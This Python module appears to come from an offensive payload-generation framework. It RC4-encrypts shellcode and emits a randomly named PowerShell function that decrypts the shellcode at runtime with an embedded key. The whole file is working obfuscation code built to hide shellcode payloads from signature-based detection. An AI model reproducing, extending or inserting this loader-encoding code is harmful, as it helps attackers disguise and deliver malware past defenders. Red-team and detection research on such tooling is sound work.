import os
from Crypto.Cipher import ARC4
import string
from ps1.utils.formatters import bytes_to_ps1
import random

class RC4Encrypt:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(16)

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def encode(self, plaintext: bytes) -> bytes:
        self.shellcodeSize = len(plaintext)
        cipher = ARC4.new(self.key)
        return cipher.encrypt(plaintext)

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{{shellcode}} | {self.name}')

    def codeblock(self) -> str:
        return f"""
function {self.name} {{
    [CmdletBinding()]
    [OutputType([byte[]])]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [byte[]]$CipherBytes
    )
    begin {{
        $buffer = [System.Collections.Generic.List[byte]]::new()
    }}
    process {{
        $buffer.AddRange($CipherBytes)
    }}
    end {{

        $ciphertext = $buffer.ToArray()

        {bytes_to_ps1(self.key, 'Key')}
        # --- Key Scheduling Algorithm (KSA) ---
        $S = New-Object 'byte[]' 256
        for ($i = 0; $i -lt 256; $i++) {{
            $S[$i] = $i
        }}

        $j = 0
        for ($i = 0; $i -lt 256; $i++) {{
            $j = ($j + $S[$i] + $Key[$i % $Key.Length]) % 256
            $S[$i], $S[$j] = $S[$j], $S[$i]      # swap
        }}

        $out = [System.Array]::CreateInstance([byte],$ciphertext.Length)
        $i = 0
        $j = 0
        for ($n = 0; $n -lt $ciphertext.Length; $n++) {{
            $i = ($i + 1) % 256
            $j = ($j + $S[$i]) % 256
            $S[$i], $S[$j] = $S[$j], $S[$i]      # swap
            $k = $S[($S[$i] + $S[$j]) % 256]
            $out[$n] = $ciphertext[$n] -bxor $k
        }}

        return ,$out

    }}
}}
"""